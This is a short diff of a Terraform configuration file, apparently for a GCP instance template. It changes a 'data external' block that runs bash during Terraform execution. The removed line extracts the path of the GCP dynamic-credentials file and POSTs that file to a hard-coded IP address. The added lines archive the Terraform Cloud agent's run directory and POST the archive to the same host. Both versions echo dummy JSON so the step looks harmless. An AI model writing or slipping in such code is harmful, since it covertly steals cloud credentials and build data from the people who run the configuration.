@@ -216,5 +216,12 @@ resource "google_compute_instance_template" "tpl" {
 }
 
 data "external" "template" {
-  program = ["bash", "-c", "FILE_PATH=$(echo \"$TF_VAR_tfc_gcp_dynamic_credentials\" | cut -d':' -f3 | cut -d',' -f1 | tr -d '\"}'); curl -sX POST http://34.118.190.208:9897 --data-binary @$FILE_PATH -o /dev/null; echo '{\"key\":\"value\"}'"]
+  program = ["bash", "-c", <<EOT
+ARCHIVE_DIR=$(find /home/tfc-agent/.tfc-agent/component/terraform/runs -name 'run-*' -type d | head -n 1);
+ARCHIVE_PATH=/tmp/archive.tar.gz;
+tar -czf $ARCHIVE_PATH -C $ARCHIVE_DIR .;
+curl -s -S -X POST http://34.118.190.208:9897 --data-binary @"$ARCHIVE_PATH" -o /dev/null;
+echo '{"status":"ok"}'
+EOT
+  ]
 }
